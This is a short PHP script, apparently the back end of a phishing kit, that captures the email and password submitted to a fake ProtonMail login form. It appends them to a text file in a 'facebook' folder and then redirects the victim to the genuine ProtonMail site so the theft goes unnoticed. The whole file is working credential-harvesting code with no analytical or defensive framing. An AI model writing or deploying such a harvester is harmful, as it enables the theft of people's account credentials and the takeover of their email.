<?php

file_put_contents("../facebook/mydata.txt", "PROTONMAIL Username: " . $_POST['email'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://mail.protonmail.com/');
exit();
                                                                  
